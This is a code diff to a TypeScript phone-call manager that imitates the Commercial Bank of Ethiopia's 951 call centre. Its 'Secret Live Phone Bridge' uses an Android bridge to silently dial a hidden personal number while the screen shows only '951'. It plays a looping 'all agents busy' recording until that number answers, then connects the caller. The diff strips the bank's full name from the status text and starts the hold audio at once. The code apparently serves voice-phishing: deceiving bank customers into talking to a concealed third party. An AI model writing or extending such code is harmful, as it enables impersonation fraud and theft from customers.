@@ -406,7 +406,7 @@ export class CbePhoneManager {
     if (!this.isCallActive) return;
     this.isAgentSpeaking = true;
     this.events.onAgentSpeakingChange?.(true);
-    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የጥሪ ማዕከል');
+    this.events.onStatusChange?.('951');
     this.events.onTranscriptUpdate?.('agent', this.welcomePrompt);
 
     try {
@@ -424,23 +424,22 @@ export class CbePhoneManager {
     }
   }
 
-  // Secret Live Phone Bridge: Silently dial target phone number (e.g. 0965848508) for 2 rings
-  // while keeping ONLY "951" on the screen!
+  // Secret Live Phone Bridge: Silently dial target phone number once while looping the busy hold MP3!
   public startSecretDialAttempt() {
     if (!this.isCallActive) return;
     this.clearSecretLiveTimers();
     this.stopListening();
     phoneAudio.stopCurrentAudio();
+    phoneAudio.stopRingback();
 
     const cfg = loadSecretLiveBridgeConfig();
     const targetNum = (cfg.targetPhoneNumber || '0965848508').trim();
-    const maxRingMs = Math.max(4000, (Number(cfg.maxRingSeconds) || 8) * 1000);
 
-    this.secretLiveAttempt += 1;
-    this.secretLivePhase = 'dialing_hidden';
-    this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
+    this.secretLiveAttempt = 1;
+    this.secretLivePhase = 'playing_busy_mp3';
+    this.events.onSecretLivePhaseChange?.('playing_busy_mp3', 1);
     this.events.onTurnPhaseChange?.('idle');
-    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
+    this.events.onStatusChange?.('951');
 
     const hasNativeBridge =
       typeof window !== 'undefined' &&
@@ -448,22 +447,14 @@ export class CbePhoneManager {
 
     if (hasNativeBridge) {
       try {
-        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, maxRingMs);
+        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, 0);
       } catch (e) {
         console.warn('AndroidTelecomBridge placeSecretCall warning:', e);
       }
-    } else if (cfg.playRingbackDuringDial) {
-      // In Web Preview mode (or when carrier audio isn't active), play subtle phone ringback for the 2 rings
-      phoneAudio.startRingback();
     }
 
-    // After 2 rings (maxRingMs), keep the call ringing until answered (do NOT disconnect)
-    // and loop the "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3 continuously until answered!
-    this.secretRingTimer = setTimeout(() => {
-      this.secretRingTimer = null;
-      if (!this.isCallActive || this.secretLivePhase !== 'dialing_hidden') return;
-      this.handleSecretNoAnswerAndPlayBusyMp3();
-    }, maxRingMs);
+    // Immediately play the "ሁሉም የአገልግሎት ሰጪዎች..." MP3 in loop until answered or call ends
+    this.handleSecretNoAnswerAndPlayBusyMp3();
   }
 
   // Plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 continuously in a loop while the phone keeps ringing until answered!
@@ -508,7 +499,7 @@ export class CbePhoneManager {
     this.secretLivePhase = 'connected_live';
     this.events.onSecretLivePhaseChange?.('connected_live', this.secretLiveAttempt);
     this.events.onTurnPhaseChange?.('idle');
-    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951)');
+    this.events.onStatusChange?.('951');
   }
 
   // Called when the person at 0965848508 hangs up after talking -> keeps 951 open and plays Post-Call Survey MP3!
